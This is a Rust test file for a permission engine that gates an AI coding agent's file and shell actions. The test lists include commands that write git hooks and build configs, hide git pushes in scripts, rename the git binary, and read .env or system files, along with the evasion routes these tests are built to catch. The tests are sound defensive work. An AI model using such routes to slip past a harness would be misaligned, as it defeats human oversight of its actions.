    let img = format!("{s}/attachments/d1/abc/shot.png");
    let d = decide_tool(&c, "Read", serde_json::json!({ "file_path": img }));
    assert_eq!(d.decision, Decision::Allow, "reading an attachment");
    for tool in ["Write", "Edit"] {
        let d = decide_tool(&c, tool, serde_json::json!({ "file_path": img }));
        assert_eq!((d.decision, d.by), (Decision::Deny, DecidedBy::HardStop), "{tool} into the attachment store");
    }
    assert_eq!(bash(&c, &format!("echo x > '{s}/attachments/d1/abc/shot.png'")).by, DecidedBy::HardStop);
    // a secret-looking name inside the store, and the rest of the state dir, stay unreadable
    let d = decide_tool(&c, "Read", serde_json::json!({ "file_path": format!("{s}/attachments/d1/abc/.env") }));
    assert_eq!((d.decision, d.by), (Decision::Deny, DecidedBy::HardStop));
    let d = decide_tool(&c, "Read", serde_json::json!({ "file_path": format!("{s}/enforcement.json") }));
    assert_eq!((d.decision, d.by), (Decision::Deny, DecidedBy::HardStop));
}

#[test]
fn leaving_plan_mode_is_the_humans_call_for_read_only_roles() {
    let fx = fx();
    let d = decide_tool(&ctx(&fx, PermissionMode::ReadOnly), "ExitPlanMode", serde_json::json!({ "plan": "x" }));
    assert_eq!((d.decision, d.rule.as_deref()), (Decision::Ask, Some("other.exit-plan")));
    assert_eq!(decide_tool(&edit(&fx), "ExitPlanMode", serde_json::json!({})).decision, Decision::Allow);
}

#[test]
fn git_aliases_are_judged_as_what_they_run() {
    let fx = fx();
    std::fs::write(fx.cwd.join(".git/config"), "[core]\n\tbare = false\n[alias]\n\tci = commit\n\tpp = !git push origin HEAD\n\tst = status -sb\n\tloop1 = loop2\n\tloop2 = loop1\n").unwrap();
    std::fs::create_dir_all(fx.cwd.join("home")).unwrap();
    std::fs::write(fx.cwd.join("home/.gitconfig"), "[alias]\n  lg = log --oneline\n  save = \"commit -a\"\n").unwrap();
    let c = edit(&fx);
    for cmd in ["git ci -m x", "git pp", "git save -m x", "git -C . ci", "cd src && git ci"] {
        assert_eq!(bash(&c, cmd).by, DecidedBy::HardStop, "{cmd}");
    }
    for cmd in ["git st", "git lg -3", "git loop1"] {
        assert_ne!(bash(&c, cmd).by, DecidedBy::HardStop, "{cmd}");
    }
}

#[test]
fn a_renamed_copy_or_link_of_the_real_git_is_still_git() {
    let real = std::path::Path::new("/usr/bin/git");
    if !real.is_file() {
        return;
    }
    let fx = fx();
    let c = edit(&fx);
    std::fs::copy(real, fx.cwd.join("gg")).unwrap();
    std::os::unix::fs::symlink(real, fx.cwd.join("gl")).unwrap();
    for cmd in ["./gg push", "./gl push origin main", "./gg commit -m x", "sh -c './gg push'", "cd src && ../gl commit"] {
        assert_eq!(bash(&c, cmd).by, DecidedBy::HardStop, "{cmd}");
    }
    assert_ne!(bash(&c, "./gl status").by, DecidedBy::HardStop, "read-only verbs through a link are fine");
    // an unrelated executable in the repo is not git
    std::fs::write(fx.cwd.join("tool.sh"), "#!/bin/sh\necho hi\n").unwrap();
    assert_ne!(bash(&c, "./tool.sh").by, DecidedBy::HardStop);
}

#[test]
fn oversized_commands_are_capped_not_parsed() {
    let fx = fx();
    let c = edit(&fx);
    let big = "x ".repeat(40_000);
    let d = bash(&c, &format!("echo {big}"));
    assert_eq!((d.decision, d.rule.as_deref()), (Decision::Ask, Some("exec.unparseable")), "{}", d.reason);
    let d = bash(&c, &format!("echo {big}; git commit -m x"));
    assert_eq!((d.decision, d.by), (Decision::Deny, DecidedBy::HardStop));
    let started = std::time::Instant::now();
    bash(&c, &"{ ".repeat(30_000));
    assert!(started.elapsed() < std::time::Duration::from_secs(10), "nesting is bounded: {:?}", started.elapsed());
}

// ---- Beta-H1: script indirection, auto-allow, strict jail ----

fn script_fx() -> Fx {
    let fx = fx();
    let w = |name: &str, text: &str| {
        let p = fx.cwd.join(name);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, text).unwrap();
    };
    w(
        "package.json",
        r#"{"name":"x","scripts":{
            "ship":"git push origin HEAD",
            "release":"npm run ship",
            "hooks":"sort -o .git/config x",
            "prepare":"husky install",
            "build":"tsc -p .",
            "test":"vitest run",
            "lint":"eslint .",
            "loop":"npm run loop"
        }}"#,
    );
    w("Makefile", "build:\n\ttsc\n\ndeploy:\n\tgit push\n\nhook:\n\t@cp x .git/hooks/pre-commit\n\nrelease: deploy\n\techo done\n");
    w("ship.sh", "#!/bin/sh\ngit commit -am x\n");
    w("ok.sh", "#!/bin/sh\necho hi\n");
    w("evil.js", "require('child_process').execSync('git push')\n");
    w("ok.js", "console.log(1)\n");
    w("evil.py", "import subprocess\nsubprocess.run(['git','commit'])\n");
    w("lock.py", "open('yarn.lock','w').write('x')\n");
    w("ok.py", "print(1)\n");
    w("evil.rb", "system('git push')\n");
    fx
}

#[test]
fn script_indirection_is_resolved_and_hard_stopped() {
    let fx = script_fx();
    let mut c = edit(&fx);
    // a second Makefile layout: the default target of the fixture is `build`, so `make` alone must also be judged
    c.saved = vec![SavedAllow::ExecPrefix { argv: vec!["npm".into()] }, SavedAllow::ExecPrefix { argv: vec!["bash".into()] }];
    // `npm install` runs `prepare` (husky install) and the others are scripts with git writes
    let misses: Vec<_> = SCRIPT_BLOCK
        .iter()
        .filter_map(|cmd| {
            let d = bash(&c, cmd);
            (!(d.decision == Decision::Deny && d.by == DecidedBy::HardStop)).then(|| format!("{cmd:?} -> {:?}/{:?}/{:?} ({})", d.decision, d.by, d.rule, d.reason))
        })
        .collect();
    assert!(misses.is_empty(), "not blocked:\n{}", misses.join("\n"));
    assert!(SCRIPT_BLOCK.len() >= 25, "{}", SCRIPT_BLOCK.len());
}

#[test]
fn clean_scripts_ask_with_their_text_and_are_never_saved() {
    let fx = script_fx();
    let mut c = edit(&fx);
    c.saved = ["npm", "pnpm", "yarn", "make", "bash", "node", "python3", "./ok.sh"].iter().map(|a| SavedAllow::ExecPrefix { argv: vec![a.to_string()] }).collect();
    for (cmd, text) in SCRIPT_ASK {
        let d = bash(&c, cmd);
        assert_eq!((d.decision, d.rule.as_deref()), (Decision::Ask, Some("exec.script")), "{cmd:?}: {d:?}");
        assert!(d.reason.contains(text), "{cmd:?} must show the resolved text {text:?}: {}", d.reason);
    }
    // a script that calls itself is judged once, not forever
    let d = bash(&c, "npm run loop");
    assert_ne!(d.by, DecidedBy::HardStop);
    // no script, no indirection: the old behaviour
    assert_ne!(bash(&c, "npm run nothere").rule.as_deref(), Some("exec.script"));
}

#[test]
fn low_risk_reads_are_allowed_only_inside_the_workspace_and_only_when_they_are_plain() {
    let fx = fx();
    std::fs::write(fx.cwd.join("a.txt"), "x").unwrap();
    std::fs::write(fx.cwd.join(".env"), "SECRET=1").unwrap();
    let home = tempfile::tempdir().unwrap();
    let mut c = edit(&fx);
    c.home = Some(std::fs::canonicalize(home.path()).unwrap());
    for cmd in ["ls", "ls -la src", "cat a.txt", "head -n 5 a.txt", "rg foo src", "grep -rn foo .", "git status", "git log --oneline -5 -- a.txt", "git diff HEAD~1", "node --check a.txt", "ls && git status", "git status | head -n 3", "cat a.txt | grep x"] {
        let d = bash(&c, cmd);
        assert_eq!((d.decision, d.rule.as_deref()), (Decision::Allow, Some("exec.low-risk-read")), "{cmd}: {d:?}");
    }
    for cmd in [
        "cat .env",
        "cat ../outside.txt",
        "cat /etc/hosts",
        "ls ~",
        "cat a.txt > out.txt",
        "cat $F",
        "cat *.txt",
        "rg --pre ./x foo",
        "git diff --output=o.patch",
        "git log --ext-diff",
        "git -c core.pager=x log",
        "git status; git commit -m x",
        "cat .git/config",
        "git show HEAD:.env",
        "tail -f a.txt",
        "ls; touch x",
    ] {
        let d = bash(&c, cmd);
        assert_ne!(d.decision, Decision::Allow, "{cmd}: {d:?}");
    }
    // Plan runs the same low-risk reads (permission-modes spec GZ-1) and nothing else; Ask mode keeps asking
    let plan = ctx(&fx, PermissionMode::ReadOnly);
    for cmd in ["ls", "cat a.txt", "git status", "rg foo src"] {
        let d = bash(&plan, cmd);
        assert_eq!((d.decision, d.rule.as_deref()), (Decision::Allow, Some("exec.low-risk-read")), "plan {cmd}: {d:?}");
    }
    for cmd in ["npm test", "cat a.txt > out.txt", "cat $F", "FOO=bar ls", "touch x", "cat /etc/hosts", "cat .env"] {
        let d = bash(&plan, cmd);
        assert_eq!(d.decision, Decision::Deny, "plan {cmd}: {d:?}");
    }
    assert_eq!(bash(&plan, "touch x").by, DecidedBy::RoleDeny);
    assert_eq!(bash(&ctx(&fx, PermissionMode::Ask), "ls").decision, Decision::Ask);
}

#[test]
fn an_env_assignment_prefix_is_never_a_low_risk_read() {
    let fx = fx();
    std::fs::write(fx.cwd.join("a.txt"), "x").unwrap();
    let c = edit(&fx);
    for cmd in ["FOO=bar cat a.txt", "FOO=bar git status", "FOO= ls", "A=1 B=2 ls", "ls && FOO=bar cat a.txt", "FOO=bar rg x ."] {
        let d = bash(&c, cmd);
        assert_eq!((d.decision, d.by), (Decision::Ask, DecidedBy::Default), "{cmd}: {d:?}");
        assert_ne!(d.rule.as_deref(), Some("exec.low-risk-read"), "{cmd}");
    }
    // the unprefixed forms keep working
    assert_eq!(bash(&c, "cat a.txt").rule.as_deref(), Some("exec.low-risk-read"));
}

#[test]
fn strict_jail_turns_writes_outside_the_repos_into_hard_stops() {
    let fx = fx();
    let outside = tempfile::tempdir().unwrap();
    let target = std::fs::canonicalize(outside.path()).unwrap().join("x.txt").display().to_string();
    let mut c = edit(&fx);
    // default context: asking (unchanged behaviour)
    let d = decide_tool(&c, "Write", serde_json::json!({ "file_path": target }));
    assert_eq!((d.decision, d.rule.as_deref()), (Decision::Ask, Some("write.outside")));
    c.strict_jail = true;
    for tool in ["Write", "Edit", "NotebookEdit"] {
        let d = decide_tool(&c, tool, serde_json::json!({ "file_path": target, "notebook_path": target }));
        assert_eq!((d.decision, d.by), (Decision::Deny, DecidedBy::HardStop), "{tool}");
    }
    let d = decide_tool(&c, "Write", serde_json::json!({ "file_path": "../sibling/x.txt" }));
    assert_eq!(d.by, DecidedBy::HardStop);
    // inside the repo, an extra repo, and reading anywhere keep working
    assert_eq!(decide_tool(&c, "Write", serde_json::json!({ "file_path": "src/a.ts" })).decision, Decision::Allow);
    let extra = tempfile::tempdir().unwrap();
    let extra = std::fs::canonicalize(extra.path()).unwrap();
    c.add_dirs.push(extra.clone());
    assert_eq!(decide_tool(&c, "Write", serde_json::json!({ "file_path": extra.join("b.ts").display().to_string() })).decision, Decision::Allow);
    assert_eq!(decide_tool(&c, "Read", serde_json::json!({ "file_path": target })).decision, Decision::Ask);
}

/// Shell writes to files that run code when the human commits, pushes, installs, lints, tests or builds (Beta-H5 b):
/// an Ask with the same "executes code" reason as a Write/Edit, even when the command prefix was saved earlier.
const EXEC_SURFACE_ASK: &[&str] = &[
    "echo x > .eslintrc.js",
    "echo x >> .eslintrc.cjs",
    "echo x >| vite.config.ts",
    "echo x > ./jest.config.js",
    "echo x > \"jest.config.js\"",
    "echo x > 'vitest.config.ts'",
    "echo x > sub/webpack.config.js",
    "echo x>.eslintrc.js",
    "cat evil >> sub/../package.json",
    "printf 'x' | tee -a package.json",
    "tee build.rs < evil",
    "echo x | tee -a ./.cargo/config.toml",
    "cp evil .cargo/config.toml",
    "cp evil ./sub/.cargo/config",
    "mv x jest.config.js",
    "mv x \"vite.config.ts\"",
    "install -m 755 evil .githooks/pre-commit",
    "sed -i s/a/b/ vite.config.ts",
    "sed -i '' s/a/b/ vite.config.ts",
    "sed -i.bak s/a/b/ sub/package.json",
    "perl -pi -e s/a/b/ .eslintrc.js",
    "awk -i inplace '{print}' package.json",
    "dd if=evil of=Makefile",
    "dd if=evil of=./build.rs",
    "ln -sf evil .vscode/settings.json",
    "ln -sf evil conftest.py",
    "echo x > .github/workflows/ci.yml",
    "echo x > lint-staged.config.js",
    "rm -f jest.config.js",
    "true && echo x > setup.py",
    "bash -c 'echo x > gulpfile.js'",
];

/// Must not become an exec-surface Ask (they read, or write ordinary source files).
const EXEC_SURFACE_PASS: &[&str] = &[
    "cat .eslintrc.js",
    "head -n 5 package.json",
    "grep -n scripts package.json",
    "rg lint vite.config.ts",
    "wc -l jest.config.js",
    "git diff package.json",
    "sed -n 1,5p vite.config.ts",
    "awk '{print}' package.json",
    "echo x > src/a.ts",
    "cp evil src/b.ts",
    "mv src/a.ts src/c.ts",
    "tee src/log.txt < a.txt",
    "sed -i s/a/b/ src/a.ts",
    "echo x > docs/jest.config.md",
];

#[test]
fn shell_writes_to_exec_surface_files_ask_and_are_never_saved() {
    let fx = fx();
    let mut c = edit(&fx);
    c.saved = ["echo", "cat", "printf", "tee", "cp", "mv", "install", "sed", "perl", "awk", "dd", "ln", "rm", "true", "bash"]
        .iter()
        .map(|a| SavedAllow::ExecPrefix { argv: vec![a.to_string()] })
        .collect();
    for cmd in EXEC_SURFACE_ASK {
        let d = bash(&c, cmd);
        assert_eq!((d.decision, d.rule.as_deref()), (Decision::Ask, Some("exec.write-exec-surface")), "{cmd:?}: {d:?}");
        assert_ne!(d.by, DecidedBy::Saved, "{cmd:?}");
        assert!(d.reason.contains("executes code"), "{cmd:?}: {}", d.reason);
    }
    let d = bash(&ctx(&fx, PermissionMode::Ask), "echo x > .eslintrc.js");
    assert_eq!((d.decision, d.rule.as_deref()), (Decision::Ask, Some("exec.write-exec-surface")));
    // Automatic and Bypass write exec-surface files inside the run's folders without asking (permission-modes spec 2.2)
    for (mode, rule) in [(PermissionMode::Automatic, "exec.auto"), (PermissionMode::Bypass, "exec.bypass")] {
        let d = bash(&ctx(&fx, mode), "echo x > .eslintrc.js");
        assert_eq!((d.decision, d.rule.as_deref()), (Decision::Allow, Some(rule)), "{mode:?}");
    }
}

#[test]
fn shell_reads_and_ordinary_writes_do_not_trip_the_exec_surface_rule() {
    let fx = fx();
    let c = edit(&fx);
    for cmd in EXEC_SURFACE_PASS {
        let d = bash(&c, cmd);
        assert_ne!(d.rule.as_deref(), Some("exec.write-exec-surface"), "{cmd:?}: {d:?}");
        assert_ne!(d.by, DecidedBy::HardStop, "{cmd:?}: {d:?}");
    }
    for cmd in ["cat .eslintrc.js", "head -n 5 package.json", "grep -n scripts package.json", "rg lint vite.config.ts", "wc -l jest.config.js", "git diff package.json"] {
        assert_eq!(bash(&c, cmd).decision, Decision::Allow, "{cmd:?}");
    }
    // protected paths stay hard stops, not asks
    for cmd in ["echo x > .husky/pre-commit", "cat >> .husky/_/husky.sh", "cp evil .git/hooks/pre-commit"] {
        assert_eq!(bash(&c, cmd).by, DecidedBy::HardStop, "{cmd:?}");
    }
}

#[test]
fn a_read_only_role_may_not_use_state_changing_tools_even_without_an_allow_list() {
    let fx = fx();
    let ro = ctx(&fx, PermissionMode::ReadOnly);
    for tool in ["EnterWorktree", "ExitWorktree", "TaskStop", "TaskCreate", "TaskUpdate", "CronCreate", "CronDelete", "RemoteTrigger"] {
        let d = decide_tool(&ro, tool, serde_json::json!({}));
        assert_eq!((d.decision, d.by, d.rule.as_deref()), (Decision::Deny, DecidedBy::RoleDeny, Some("other.read-only")), "{tool}");
    }
    // outside read-only the old behaviour stands: ask
    let d = decide_tool(&edit(&fx), "EnterWorktree", serde_json::json!({}));
    assert_eq!((d.decision, d.rule.as_deref()), (Decision::Ask, Some("other.unknown")));
}
